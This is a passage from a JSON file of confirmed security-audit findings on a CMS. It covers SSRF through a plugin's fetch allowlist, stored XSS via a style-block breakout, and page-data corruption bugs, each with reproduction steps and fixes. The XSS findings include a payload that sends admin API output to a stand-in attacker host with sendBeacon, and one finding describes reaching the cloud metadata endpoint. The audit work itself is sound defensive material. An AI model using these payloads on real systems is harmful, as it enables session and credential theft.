a 302 to http://127.0.0.1:5432 / http://169.254.169.254/. Because host validation runs only on the initial URL string and redirects are auto-followed with no re-validation, the request reaches loopback/link-local. The consent UI cannot catch this — the displayed entry is benign.","falsePositiveReason":"","refinedFix":"Add an SSRF guard inside performGatedFetch (the single kernel-of-correctness for outbound) covering both literal hosts and post-DNS/post-redirect addresses:\n\n1. Reject IP-literal allowlist entries at manifest-parse time: in src/core/plugins/manifest.ts (parsePluginManifest, ~line 555) and the SDK lint (src/core/plugin-sdk/cli/lint.ts), reject any networkAllowedHosts entry that parses as an IP in a loopback/link-local (169.254.0.0/16, ::1)/private (RFC1918, fc00::/7)/0.0.0.0 range, and reject `localhost`. The host pattern admitting numeric labels is the wrong place to enforce this, but make manifest parsing fail-closed on these.\n\n2. In performGatedFetch (server/plugins/host/network.ts), after the protocol+allowlist checks, resolve the target host to its IP(s) (Bun.dns / node dns.lookup with `all`) BEFORE issuing the request and reject if any resolved address is loopback, link-local, private, unique-local, or unspecified. Centralize a `isBlockedAddress(ip)` helper.\n\n3. Disable automatic redirect following: pass `redirect: 'manual'` to fetch (line 76) and, on a 3xx, re-run BOTH the allowlist check and the IP guard against the Location URL before following (bounded redirect count). This closes the rebinding/redirect-to-private vector that the consent UI cannot catch.\n\n4. To fully close TOCTOU DNS rebinding (resolve-then-connect race), prefer connecting to the validated resolved IP directly (pinning) rather than re-resolving the hostname, or accept the small residual window as documented. Keep the fix in performGatedFetch so all callers inherit it. Update docs/features/plugin-system.md and sandbox.md network-access section, and add an architecture/host test asserting loopback/link-local/RFC1918 targets and private-redirect targets are rejected."},{"id":"ISS-007","finder":"sec-xss","title":"Inline CSS emission bakes raw user stylesheet + framework CSS into a \u003cstyle> block without \u003c/style> neutralisation — stored XSS in the admin Live Canvas iframe","category":"security","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS via style-block escape)","file":"src/core/publisher/render.ts","lineStart":202,"lineEnd":211,"description":"In the inline CSS emission path (`buildStyleHead`, the DEFAULT mode), the publisher concatenates `PUBLISHER_RESET_CSS`, `frameworkCss`, `moduleCss`, `classCss`, and `userCss` into a single inline `\u003cstyle>` block. Only `moduleCss` and `classCss` were neutralised at their source (`cssCollector.ts` / `collectClassCSS` run `sanitizeModuleCSS`, which rewrites `\u003c/style` → `\u003c\\/style`). `frameworkCss` (from `buildSiteFrameworkCss`) and especially `userCss` (from `collectUserStylesheetCss`, which returns raw `file.content` verbatim — see userStylesheets.ts:60) are joined into the `\u003cstyle>` block WITHOUT any `\u003c/style>` neutralisation. A user-authored global stylesheet whose body contains `\u003c/style>\u003cscript>…\u003c/script>` therefore breaks out of the RAWTEXT `\u003cstyle>` element and injects executable HTML. The external-bundle path (`cssEmission:'external'`) is immune because each bundle is served as a separate `\u003clink>` resource, but inline is the default and is the mode used by the runtime preview document (`server/publish/runtime/previewRuntime.ts:85` calls publishPage with no cssEmission → inline).","impact":"The runtime preview document is rendered into an admin iframe with `sandbox=\"allow-scripts allow-same-origin\"` (src/admin/pages/content/components/LiveCanvas/LiveCanvas.tsx:669), so injected `\u003cscript>` executes in the admin same-origin context with access to the authenticated admin session — it can call any `/admin/api/*` endpoint, read the DOM, exfiltrate data. This is stored XSS in the CMS admin. The same raw content also lands in inline-mode ZIP exports. The `userStyles` content is the single most user-controlled CSS surface in the product, yet it is the one path that skips the `\u003c/style>` guard that every other CSS source goes through.","reproduction":"1. As an author, create a global stylesheet in the Site > Styles panel with content `body{}\u003c/style>\u003cscript>fetch('/admin/api/whoami').then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker/',t))\u003c/script>` and enable it. 2. Open the page in the Live Canvas / runtime preview (POST /admin/api/cms/runtime/preview → buildRuntimePreviewDocument → publishPage inline mode → LiveCanvas iframe with allow-scripts allow-same-origin). 3. The `\u003c/style>` closes the inline style block and the injected script executes in the admin origin. (Also: `bun run dev`, paste the stylesheet, observe in the served preview HTML that the `\u003cstyle>` block is broken by the literal `\u003c/style>`.)","evidence":"const userCss = collectUserStylesheetCss(site, page)\n  // Same cascade order ...\n  const allCss = [PUBLISHER_RESET_CSS, frameworkCss, moduleCss, classCss, userCss]\n    .filter(Boolean)\n    .join('\\n')\n  return `  \u003cstyle>\\n${allCss}\\n  \u003c/style>\\n`","suggestedFix":"Route the inline path's user CSS and framework CSS through the same `\u003c/style>` neutraliser used elsewhere. Simplest: in render.ts wrap the assembled CSS — `const allCss = sanitizeModuleCSS([PUBLISHER_RESET_CSS, frameworkCss, moduleCss, classCss, userCss].filter(Boolean).join('\\n'))` — importing `sanitizeModuleCSS` from `./cssCollector`. (Reset is constant and safe, but neutralising the whole concatenation is harmless and removes the per-source asymmetry.) Equivalently, apply `sanitizeModuleCSS` inside `collectUserStylesheetCss` and `buildSiteFrameworkCss` so every inline CSS source is guarded at its origin, matching the pattern already used for module/class CSS.","assessment":"The technical claim is accurate and I confirmed every link: (a) `collectUserStylesheetCss` returns raw `file.content`; (b) `frameworkCss` is also unsanitised; (c) `moduleCss`/`classCss` DO go through `sanitizeModuleCSS` which neutralises `\u003c/style`, so the asymmetry the finder describes is exactly correct; (d) inline is the default mode and is what the preview iframe uses; (e) the preview HTML lands in an `allow-scripts allow-same-origin` iframe via srcDoc, so a `\u003c/style>\u003cscript>` breakout executes in the admin origin. So it IS a real injection in the admin preview path.\n\nHowever the severity must be re-scoped for a self-hosted SINGLE-TENANT CMS. The author who writes the malicious stylesheet and the operator who views the preview are both trusted admin-level users holding `site.read`/`site.style.edit` — users who already author arbitrary CSS and JS (the CMS has first-class user scripts and a plugin runtime). No privilege boundary is crossed: this is effectively self-XSS confined to the admin preview iframe. The public published site is provably immune (external/`\u003clink>` mode), and the live canvas injector uses textContent (immune). The one scenario with a genuine trust crossing is opening an *imported* site document / template that carries a poisoned style file in the preview — that is plausible since plugins/imported content may be untrusted, which keeps this above 'low'. The fix is trivial, correct, and removes a real per-source guard asymmetry, so it should be fixed regardless.","replicationSteps":"End-to-end trace (admin preview iframe, the only reachable sink):\n1. Authenticated user with `site.read` (or `site.style.edit`) creates a style file in Site > Styles whose content is `body{}\u003c/style>\u003cscript>fetch('/admin/api/cms/...').then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker/',t))\u003c/script>`, enables it, and scopes it to the page. Style file content is stored verbatim — `SiteFileSchema.content` is a freeform string with no `\u003c/style>` sanitization at write.\n2. Opening the page in the Live Canvas issues `POST /admin/api/cms/runtime/preview` (server/handlers/cms/runtime.ts:133, gated by `requireCapability(..., 'site.read')`).\n3. The handler calls `buildRuntimePreviewDocument` (server/publish/runtime/previewRuntime.ts:49), which calls `publishPage(...)` with NO `cssEmission` option. `render.ts:504` defaults to `options.cssEmission ?? 'inline'`.\n4. `buildStyleHead` inline branch (render.ts:202-211) builds `const userCss = collectUserStylesheetCss(site, page)` — which returns raw `file.content` verbatim (userStylesheets.ts ~line 56-60) — and concatenates `[PUBLISHER_RESET_CSS, frameworkCss, moduleCss, classCss, userCss]` into a literal `\u003cstyle>...\u003c/style>` HTML string. `moduleCss`/`classCss` were neutralised via `sanitizeModuleCSS` (cssCollector.ts:99,135 — `replace(/\u003c\\/style/gi, '\u003c\\\\/style')`), but `userCss` and `frameworkCss` are NOT.\n5. The returned HTML string is set as `\u003ciframe srcDoc={preview.html} sandbox=\"allow-scripts allow-same-origin\">` in LiveCanvas.tsx:~669. `srcDoc` is parsed as HTML, so the literal `\u003c/style>` closes the RAWTEXT style element and the injected `\u003cscript>` executes in the admin same-origin context.\n\nNOT reachable on the public site: publicRenderer.ts:70,113 publish with `cssEmission: 'external'`, serving each CSS bundle as a separate `\u003clink>` resource (immune). The canvas live-edit injector (UserStylesheetInjector.tsx:76) uses `styleEl.textContent = css` (DOM API), also immune. Inline-mode ZIP exports carry the same raw bytes.","falsePositiveReason":"","refinedFix":"In render.ts:208, route the full assembled inline CSS through the same neutraliser the other sources use, so no inline CSS source can break out of the `\u003cstyle>` element:\n\n```ts\nimport { sanitizeModuleCSS } from './cssCollector'\n// ...\nconst allCss = sanitizeModuleCSS(\n  [PUBLISHER_RESET_CSS, frameworkCss, moduleCss, classCss, userCss].filter(Boolean).join('\\n'),\n)\nreturn `  \u003cstyle>\\n${allCss}\\n  \u003c/style>\\n`\n```\n\nsanitizeModuleCSS is idempotent (`\u003c/style` → `\u003c\\/style`), so re-running it over the already-sanitised module/class CSS is harmless, and PUBLISHER_RESET_CSS is a constant with no `\u003c/style`. This guards both `userCss` and `frameworkCss` in one place. Equivalently (and arguably cleaner per the codebase's \"guard at the boundary\" convention) apply `sanitizeModuleCSS` inside `collectUserStylesheetCss` (wrap the final concatenated return) and inside `buildSiteFrameworkCss`, so every inline CSS source is neutralised at its origin and the inline emitter has no per-source asymmetry. Note the external bundle path also benefits from origin-level sanitisation defensively (it is currently immune only because bundles are served as separate resources, but a future change that inlines a bundle would re-expose it). Add/extend a unit test asserting that a style file containing `\u003c/style>\u003cscript>` produces no raw `\u003c/style` in the inline preview HTML."},{"id":"ISS-011","finder":"sec-ssrf","title":"No private/loopback/link-local IP blocking; manifest host regex accepts raw internal IPs and localhost","category":"security","provisionalSeverity":"medium","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-918: Server-Side Request Forgery (SSRF)","file":"src/core/plugins/manifest.ts","lineStart":45,"lineEnd":45,"description":"The host-validation regex NETWORK_HOST_PATTERN (/^(?:\\*\\.)?[a-z0-9]([a-z0-9-]*[a-z0-9])?(?:\\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/) used for both manifest networkAllowedHosts entries (manifest.ts:251-252) and the IPC schema (server/plugins/protocol/schemas/network.ts:12) matches dotted-decimal IP literals such as 127.0.0.1, 169.254.169.254, 10.0.0.5, and the bare label localhost — they all satisfy the [a-z0-9...] grammar. performGatedFetch (server/plugins/host/network.ts:58-65) then enforces only scheme (http/https) and the literal allowlist string match; there is no check that the resolved destination is a public IP. So a plugin may directly allowlist and reach internal addresses, and even for public hostnames there is no defense against DNS rebinding (the allowlist check runs on the hostname string while fetch does its own DNS resolution that can point at an internal IP).","impact":"Combined with operator consent fatigue, a plugin can request network.outbound with networkAllowedHosts: ['169.254.169.254'] or ['localhost'] and hit cloud metadata / internal services directly, or use a public hostname under attacker DNS control that resolves to an internal IP (DNS rebinding). The allowlist provides hostname-level intent but no IP-level egress control.","reproduction":"1. Plugin manifest declares network.outbound + networkAllowedHosts: ['169.254.169.254'] (passes the regex and TypeBox validation). 2. After install, plugin calls fetch('http://169.254.169.254/latest/meta-data/...'). 3. hostMatchesAllowlist returns true; performGatedFetch issues the request to the cloud metadata endpoint and returns the credentials body to the sandbox.","evidence":"const NETWORK_HOST_PATTERN = /^(?:\\*\\.)?[a-z0-9]([a-z0-9-]*[a-z0-9])?(?:\\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/","suggestedFix":"Before issuing the fetch, resolve the destination and reject any request whose target IP falls in private/loopback/link-local/CGNAT/unique-local ranges (and the IPv6 equivalents). Reject IP-literal and 'localhost' entries in networkAllowedHosts at manifest-validation time unless an explicit operator opt-in is set. Resolve the host once and pass the pinned IP to fetch (or re-resolve and re-validate) to close the DNS-rebinding window.","assessment":"The report is technically accurate and I confirmed every cited line. The regex genuinely matches IP literals and `localhost`, and performGatedFetch performs no IP egress control — only scheme + hostname-string allowlist matching, then a raw fetch that does its own DNS resolution. Two vectors exist and they have different severities. (1) Operator directly allowlisting an internal IP/localhost: requires a trusted admin to install + grant network.outbound + accept a consent screen that visibly lists the internal target — a largely self-inflicted action with no privilege boundary crossed, so by itself this is low. (2) DNS rebinding / public-host-resolves-to-internal: this is the real issue. Untrusted plugin code (the QuickJS sandbox + permission gate exist precisely to contain it) declares a plausible public hostname, gains consent, then has the attacker's DNS point it at internal addresses. The allowlist's hostname-string check is bypassed at resolution time, defeating the egress-containment intent of the network.outbound design. This is reachable by untrusted plugins and constitutes a real SSRF, which keeps the finding alive. I downgrade from any-higher to medium because exploitation still requires network.outbound to be granted (a deliberate operator consent) and impact is bounded by the host's internal network / metadata exposure; it is not unauthenticated or public-request reachable.","replicationSteps":"Traced end-to-end. Entry point: plugin RPC `network.fetch` -> server/plugins/host/handlers/network.ts:29 asserts `network.outbound` granted, then line 31 calls performGatedFetch -> server/plugins/host/network.ts:46. There performGatedFetch only checks (a) scheme is http/https (line 58) and (b) hostMatchesAllowlist(parsed.host, manifest.networkAllowedHosts) (line 62), then issues a raw `fetch(urlString, ...)` (line 76) with NO IP-level egress filtering.\n\nDirect-allowlist path (requires operator action): NETWORK_HOST_PATTERN at manifest.ts:45 = /^(?:\\*\\.)?[a-z0-9]([a-z0-9-]*[a-z0-9])?(?:\\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/. Verified by inspection that `127.0.0.1`, `169.254.169.254`, `10.0.0.5`, and `localhost` all match (digits and the bare label satisfy the [a-z0-9] grammar; dots are allowed separators). A manifest with networkAllowedHosts:['169.254.169.254'] therefore passes the TypeBox pattern (manifest.ts:251-252) and the same IPC schema (server/plugins/protocol/schemas/network.ts:12). hostMatchesAllowlist lowercases and string-compares (network.ts:41), returns true, and fetch hits the metadata endpoint. This path requires a trusted admin to install the plugin (install.ts requires an AuthUser, audit-logged) and grant network.outbound while the internal host is visible in the consent screen.\n\nDNS-rebinding path (untrusted plugin, the materially dangerous one): plugin declares a benign public host e.g. networkAllowedHosts:['data.attacker-controlled.example']. Operator consents (looks like a normal third-party API). The allowlist check at network.ts:62 validates the hostname STRING only; the subsequent fetch (line 76) performs its OWN DNS resolution. Attacker DNS resolves that host to 169.254.169.254 / 127.0.0.1 / 10.x. Request reaches internal services / cloud metadata; response body is returned to the sandbox (lines 84-90). No re-validation against the resolved IP exists anywhere in the path.","falsePositiveReason":"","refinedFix":"Add IP-level egress control in performGatedFetch (server/plugins/host/network.ts) — the kernel-of-correctness — so the fix covers both vectors regardless of manifest contents:\n\n1. Pin the resolved IP. Resolve the URL host once (Bun.dns / dns.lookup with `all: true`), reject if ANY resolved address is in a blocked range (IPv4: 127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254/16 link-local incl. 169.254.169.254, 100.64/10 CGNAT, 0.0.0.0/8; IPv6: ::1, fc00::/7 ULA, fe80::/10 link-local, ::ffff:0:0/96 IPv4-mapped equivalents, and unspecified ::). Then connect to the PINNED IP (set the resolved address as the connect target, sending the original Host header) so DNS cannot rebind between the check and the connection. If pinning to a specific IP isn't feasible with Bun's fetch, re-resolve immediately before connect and re-validate, and also reject on redirects by setting `redirect: 'manual'` and re-validating each hop's host+IP. Always re-validate after any redirect.\n\n2. Also reject IP literals and the bare `localhost` label at manifest-validation time. Tighten NETWORK_HOST_PATTERN (manifest.ts:45 and the duplicated copy in server/plugins/protocol/schemas/network.ts:12 — keep them in sync, gated by a test) to require at least one alphabetic-containing label / a TLD-like final segment, and add an explicit reject for all-numeric dotted forms and `localhost`. This is defense-in-depth and gives the operator a clear signal at consent time, but it does NOT close DNS rebinding — step 1 is the load-bearing fix.\n\nAdd an architecture/unit test asserting performGatedFetch refuses fetches whose host resolves to a private/loopback/link-local/CGNAT/ULA address, including the IPv4-mapped-IPv6 forms.\n\nCWE-918 (SSRF). Also relevant: CWE-1385 (insufficient verification of resolved address — DNS rebinding)."},{"id":"ISS-016","finder":"bug-persistence","title":"Load-time silent VC drop cascades into permanent deletion of page content (slot fills) on next save","category":"data-integrity","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-20: Improper Input Validation (leading to CWE-460/CWE-674-adjacent silent data loss); import path is CWE-20 missing semantic validation","file":"src/core/persistence/validate.ts","lineStart":158,"lineEnd":177,"description":"On load, `validateVisualComponents` runs in repair mode and SILENTLY drops any VC that (a) has a name that collides with an earlier VC (dedupeVCsByName, first-wins), (b) participates in a dependency cycle (filterCyclicVCs), or (c) has an invalid name. `cms.ts:loadSite` then calls `validatePages(shell, rawPages, visualComponents)` with the *post-drop* VC list. Inside `validatePages`, `stripDanglingVCRefsInPages` (validate.ts:139, :264-320) walks every page tree, finds every `base.visual-component-ref` whose `componentId` is not in the surviving VC id set, and DELETES the entire ref subtree — the ref node, all auto-generated `base.slot-instance` children, AND all user-authored content materialized inside those slots — then splices the ref out of its parent's children[]. This mutated, content-truncated page tree is what `loadSite` returns and what the editor store hydrates. The next `saveSite` serializes the truncated tree via `pageToCells`, making the deletion permanent. So a recoverable condition (two VCs sharing a name, or an accidental dependency cycle) silently and irreversibly destroys arbitrary amounts of authored page content.","impact":"Silent, unrecoverable loss of authored page content. A single duplicate VC name or a dependency cycle in stored data causes every page that referenced the dropped component to lose its entire VC-ref subtree (including hand-authored slot fills) the moment the site is loaded and re-saved. The user sees content vanish with no error, no warning, and no undo.","reproduction":"1. Get two component rows in data_rows (table_id='components') that share a name, or two that form a ref cycle (e.g. via bundle import with merge strategy, a plugin tree mutation, or restoring an older export). 2. Have a page contain a `base.visual-component-ref` to the second (dropped) VC with user content in its slots. 3. Open the site in the admin editor (triggers loadSite). 4. validateVisualComponents drops the second VC; validatePages strips the ref subtree from the page. 5. Make any edit and save — the truncated tree is persisted; the slot content is gone for good.","evidence":"// validateVisualComponents (load/repair mode)\nconst deduped = dedupeVCsByName(parsed)   // drops dup-name VCs, first-wins\nconst acyclic = filterCyclicVCs(deduped)  // drops cyclic VCs\n...\n// validatePages then strips refs to anything not in `visualComponents`:\nstripDanglingVCRefsInPages(pages, visualComponents)\n// stripOneNodeMap deletes the whole subtree of a ref to a dropped VC:\nfor (const id of subtreeIds) { delete nodes[id] }","suggestedFix":"Do not couple repair-mode VC dropping with destructive page-tree stripping in the same load. Either (a) make the load path treat dup-name/cyclic VCs as a hard validation error surfaced to the operator (like a corrupt page) instead of silently dropping them, or (b) keep dropped-VC refs intact in the page tree (render a placeholder) rather than deleting the user's content. At minimum, only strip refs to VCs that are genuinely absent from storage, never to VCs that were merely de-duplicated or de-cycled by the loader.","assessment":"The report is accurate and I could not refute it. The load path (CmsAdapter.loadSite) runs validateVisualComponents in repair mode, which silently drops dup-name (dedupeVCsByName) and cyclic (filterCyclicVCs) VCs, then passes the shrunken VC list to validatePages → stripDanglingVCRefsInPages → stripOneNodeMap, which deletes the entire ref subtree including hand-authored slot content. The next save persists the truncation.\n\nThe decisive question was whether dup-name/cyclic component rows can actually reach storage. The normal editor write path (PUT /components → validateVisualComponentsForWrite) hard-rejects them, so they cannot. BUT the import endpoint (POST /admin/api/cms/import) writes component data_rows directly with only structural SiteBundleSchema validation and no semantic VC validation — it bypasses validateVisualComponentsForWrite entirely. Because a DataRow's slug is independent of cells.name, a crafted bundle can carry two same-name VCs with distinct slugs (defeating the only relevant DB unique index) or a two-VC dependency cycle (no constraint at all). merge-add/merge-overwrite require only the `data.import` capability (no step-up). This makes the corrupting precondition concretely reachable, and a legitimately-produced older export could also contain such shapes innocently.\n\nThe strip-on-dangling behavior is itself intended (stripDanglingVCRefs.test.ts) for genuinely-missing VCs and self-healing. The bug is the coupling: repair-mode dedupe/cycle-drop manufactures a fake \"dangling\" condition for VCs that DO exist in storage, turning a recoverable situation (two VCs sharing a name, or an accidental cycle) into silent, irreversible deletion of arbitrary authored page content with no error, no warning, no undo.\n\nSeverity for a single-tenant CMS: I downgrade from the reported high to medium. It is data-integrity (not RCE/auth/sandbox), it requires an admin-initiated import (or a crafted/old export) rather than an unauthenticated/public request, and admin operators are trusted. But it is not fully dismissible: imported bundles are an explicitly-untrusted content channel, the precondition is reachable without step-up via merge strategies, the loss is silent and permanent, and it can fire from a benign older export. Medium fits a reachable-via-untrusted-input silent data-loss bug.","replicationSteps":"End-to-end path traced and confirmed:\n\nENTRY POINT — POST /admin/api/cms/import?strategy=merge-overwrite (or merge-add / replace) in server/handlers/cms/import.ts. Bundle rows are validated only against SiteBundleSchema (src/core/data/bundleSchema.ts → DataRowSchema in schemas.ts), which has a free-form `cells: Record\u003cstring,unknown>` and an independent `slug: string`. Import writes component rows directly via replaceDataRow/upsertDataRow/insertDataRowIfAbsent (import.ts:184/285/224) — it NEVER calls validateVisualComponentsForWrite. So the strict write-boundary checks (validate.ts:187-208: dup-id, dup-name, dangling-ref, cycle → hard throw) are entirely bypassed on import.\n\n(a) Duplicate-name case: craft two component rows with identical cells.name (e.g. \"Hero\") but distinct id and distinct slug (\"hero\",\"hero-2\"). They pass SiteBundleSchema and the data_rows (table_id, slug) unique index (migrations-sqlite.ts:291-293) because slug != name and the two slugs differ. Both land in storage.\n(b) Cycle case: two distinctly-named/slugged VCs whose trees each contain a base.visual-component-ref to the other. No DB constraint blocks this at all.\n\nLOAD — Admin opens the site editor → usePersistence load effect (usePersistence.ts:155) → CmsAdapter.loadSite (cms.ts:78). It calls validateVisualComponents(rawVCs) (cms.ts:115). In repair mode: dedupeVCsByName (validate.ts:172,401-409) drops the second same-name VC (first-wins); filterCyclicVCs (validate.ts:173,326-349) drops BOTH cyclic VCs. The surviving VC id set no longer contains the dropped ids.\n\nSTRIP — loadSite then calls validatePages(shell, rawPages, visualComponents) with the post-drop VC list (cms.ts:120). stripDanglingVCRefsInPages (validate.ts:139,264-267) builds knownVcIds from the surviving VCs, and stripOneNodeMap (validate.ts:284-319) treats every page base.visual-component-ref whose componentId is a dropped VC as dangling: it DFS-collects the whole subtree (ref + auto base.slot-instance children + user-authored slot content), splices the ref out of the parent's children[], and deletes every subtree node from the flat map (delete nodes[id]). The truncated page tree is returned and hydrated into the editor store via loadSite(site) (usePersistence.ts:157).\n\nPERSIST — Any edit + save: saveCurrentSite → CmsAdapter.saveSite(site) (usePersistence.ts:111, cms.ts:36) PUTs the full in-memory pages roster to PUT /admin/api/cms/pages. The server re-runs validatePages but with the RAW (non-deduped) VC roster, so it does not re-strip — it simply persists the already-truncated tree via pageToCells (pages.ts:87-114). The deletion is now permanent in data_rows; the publish path (publish.ts:193) reads pages without validatePages, so the loss propagates to published output too.\n\nConfirmed: no guard prevents the import-introduced dup-name/cyclic component rows, and the repair-mode VC drop is structurally coupled to destructive page-tree stripping in the same loadSite call.","falsePositiveReason":"","refinedFix":"Decouple repair-mode VC dropping from destructive page-tree stripping. Concretely:\n\n1. In validatePages/stripDanglingVCRefsInPages, only strip refs to componentIds that are GENUINELY ABSENT FROM STORAGE — never to VCs that were merely de-duplicated or de-cycled by the loader. The cleanest way: build the \"known VC ids\" set for the page-strip from the RAW parsed VC roster (every id that exists in data_rows, before dedupe/cycle filtering), not from the post-repair surviving list. Pass that raw-id set down separately. A ref whose target exists in storage but was repaired-away must be RENDERED (placeholder / unresolved state), not deleted.\n\n2. Address the import bypass at the source: the import endpoint (server/handlers/cms/import.ts) must run the same semantic VC validation the editor write path uses. After writing component rows, re-read the components for the table and run validateVisualComponentsForWrite (or an equivalent in-transaction check) so a bundle carrying duplicate-name or cyclic VCs is rejected (or normalized — e.g. rename-on-collision) before commit, rather than silently corrupting storage. This closes the only path that can introduce the precondition.\n\n3. Make the load path surface repair-mode drops to the operator instead of swallowing them: when validateVisualComponents drops a dup-name or cyclic VC, return that as a structured, operator-visible warning (role=\"alert\" in the editor) so the condition is recoverable rather than silent. Do not auto-strip authored content on the basis of a repaired-away VC.\n\n4. Add a regression test: a stored roster with two same-name VCs (or a 2-cycle) plus a page that references the dropped VC with authored slot content → after loadSite, the page's slot content MUST be preserved (ref rendered as unresolved), not deleted; and a save MUST NOT truncate the tree. Co-locate with src/__tests__/persistence/stripDanglingVCRefs.test.ts."},{"id":"ISS-017","finder":"bug-persistence","title":"A single malformed page `body` cell hard-aborts the entire site load (whole admin bricked)","category":"bug","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-754: Improper Check for Unusual or Exceptional Conditions (with CWE-20 at the write boundary)","file":"src/core/persistence/validate.ts","lineStart":506,"lineEnd":514,"description":"`validatePages` → `validatePageNodeTreesList` calls `assertValidNodeTree(pages[i], ...)` for each page and rethrows the first failure as `SiteValidationError`. `pageFromRow` is documented as best-effort and falls back to `nodes = {}` / `rootNodeId = ''` when a row's `body` cell is missing or malformed (pageFromRow.ts:42-53). But `assertValidNodeTree` immediately throws on `rootNodeId = ''` because `tree.nodes[''']` is undefined (operationSchema.ts:84). `cms.ts:loadSite` does not catch this — it propagates out of `loadSite`, so the entire site (shell + all other valid pages + all VCs) fails to load. This is an asymmetry with VC handling, where a corrupt VC row is silently dropped (componentFromRow returns null, flatMap skips it) and the rest of the site loads fine. For pages, one bad row takes down everything.","impact":"One corrupt or partially-written page row makes the whole admin editor unloadable — the operator cannot open the site to even delete or fix the offending page. This converts a single-row data glitch (partial write, bad plugin mutation, truncated import) into a total CMS outage with no in-product recovery path.","reproduction":"1. Cause any single page row in data_rows (table_id='pages') to have a missing/non-object `body` cell, or a `body` whose `rootNodeId` doesn't exist in `nodes` (partial write, failed migration, manual edit, or a bundle import that produced one). 2. Load the admin site editor. 3. loadSite throws SiteValidationError and the whole site — every other valid page included — fails to render.","evidence":"function validatePageNodeTreesList(pages: Page[]): void {\n  for (let i = 0; i \u003c pages.length; i++) {\n    try {\n      assertValidNodeTree(pages[i], `site.pages[${i}]`)\n    } catch (err) {\n      throw siteValidationErrorFromTreeInvariant(err, `site.pages[${i}]`)\n    }\n  }\n}\n// pageFromRow falls back to rootNodeId = '' on a malformed body,\n// and assertValidNodeTree throws: root node \"\" not found in nodes","suggestedFix":"Make page loading as fault-tolerant as VC loading: skip/quarantine an individual unparseable page row (log it, surface a non-blocking warning) rather than aborting the entire site load, OR surface a per-page recoverable error state in the UI so the operator can delete/repair the bad page. Do not let one row's corruption block hydration of the entire document.","assessment":"The report's mechanism is accurate and I traced it myself rather than trusting the finder. pageFromRow's documented best-effort fallback (rootNodeId='') combined with assertValidNodeTree's hard throw and loadSite's missing try/catch produces a whole-document load failure from a single bad page row, in clear asymmetry to VC handling which drops corrupt rows. The crash line is exactly validate.ts:506-513 as reported. I additionally verified that malformed `pages` rows are actually producible: two write paths (the generic data-rows PATCH endpoint and the bundle import endpoint) persist arbitrary `body` cells to `pages` rows with no page-tree coherence validation and no system-table guard. This is not theoretical: the import path is the project's explicit channel for untrusted content, and a single dangling rootNodeId in an imported page row yields a total, in-product-unrecoverable admin lockout (the operator cannot open the editor to delete or repair the offending page). I downgrade from the reported 'high' to 'medium' because both triggers require an already-authenticated actor (no unauthenticated/public/plugin-sandbox reach) and the impact is availability/DoS with manual DB-level recovery still possible, not RCE/privilege escalation/data destruction. The import vector keeps it above 'low' because imported content is untrusted in this codebase's threat model and the failure mode is total + non-self-healing.","replicationSteps":"Confirmed end-to-end, two independent ingress paths that persist a malformed `pages` row without page-tree validation, plus the fatal load path:\n\nLOAD (the crash):\n1. `loadSite` (src/core/persistence/cms.ts:118-120) does `rawDataRows.map(pageFromRow)` then `validatePages(shell, rawPages, vcs)` with NO try/catch.\n2. `pageFromRow` (src/core/data/pageFromRow.ts:42-53) is best-effort: a missing/non-object `body`, or a `body.rootNodeId` not present in `body.nodes`, yields `rootNodeId=''` (or a dangling id) and `nodes={}`.\n3. `parsePage` (src/core/page-tree/page.ts:77) only checks `typeof rootNodeId === 'string'`; the schema is `rootNodeId: Type.String()` (treeSchema.ts:47), so `''` passes structural parse.\n4. `validatePages` → `validatePageNodeTreesList` (validate.ts:506-513) → `assertValidNodeTree` (operationSchema.ts:84-85) throws `root node \"\" not found in nodes`, rethrown as `SiteValidationError`. It is the FIRST loop iteration's throw — every other valid page and the shell never hydrate. The error propagates out of `loadSite`, bricking the editor.\n5. Asymmetry confirmed: a corrupt VC row is silently dropped (componentFromRow returns null + `flatMap` skip at cms.ts:111-114; validateVisualComponents is tolerant), but one corrupt page row is fatal.\n\nWRITE PATH A (authed editor, direct API):\n- `PATCH /admin/api/cms/data/rows/:id` (server/handlers/cms/data/rows.ts:166-176) accepts `RowUpsertBodySchema` whose `cells` is `Type.Record(Type.String(), Type.Unknown())` (data/schemas.ts:37-39). It writes cells verbatim via `saveDataRowDraft` with NO page-tree validation and NO system-table guard (loadRowForAccess at rows.ts:110-120 looks up by id only). A user with `content.edit.any`/`content.manage` (or `content.edit.own` on an owned page row) can set `cells.body = { rootNodeId: 'x', nodes: {} }` on a `pages` row. Next `loadSite` bricks.\n\nWRITE PATH B (untrusted import — matches the project threat model for imported content):\n- `POST /admin/api/cms/import` (server/handlers/cms/import.ts:172-178) inserts `bundle.rows` with `cells: row.cells` verbatim for any `tableId` including `pages`. `SiteBundleSchema.rows` is `DataRowSchema[]` whose cells is the same unstructured `DataRowCellsSchema`. A malformed/hostile bundle with one `pages` row carrying a dangling `body.rootNodeId` is stored, then bricks the editor on next load. Gated by `data.import` (+`content.manage`+step-up for `replace`).","falsePositiveReason":"","refinedFix":"Make page loading as fault-tolerant as VC loading — one bad row must not abort hydration of the whole site. Two complementary fixes:\n\n1) Per-page quarantine in validate.ts. Change `validatePageNodeTreesList` (and the `parsePage` loop in `validatePages` at validate.ts:128-135) so a failure on page i is logged (`console.error('[persistence/validate] dropping invalid page', err)`) and the page is SKIPPED rather than throwing out of the whole batch — mirroring `validateVisualComponents`'s tolerant `flatMap`/first-wins behavior. Keep the slug-uniqueness and slot-sync passes operating only over the surviving pages. This restores the documented invariant in pageFromRow.ts:34-36 (\"so a corrupt row doesn't prevent loading the rest of the site\"), which is currently violated. If silent drop is undesirable, accumulate the dropped page ids and surface them as a non-blocking warning state in the editor UI (role=\"status\") so the operator can see and delete the bad page.\n\n2) Validate page bodies at the write boundary so malformed `pages` rows can't be persisted in the first place. The generic `PATCH /admin/api/cms/data/rows/:id` (data/rows.ts:166-176) and `POST /admin/api/cms/import` (import.ts:172-178) write arbitrary cells to `pages` rows with no 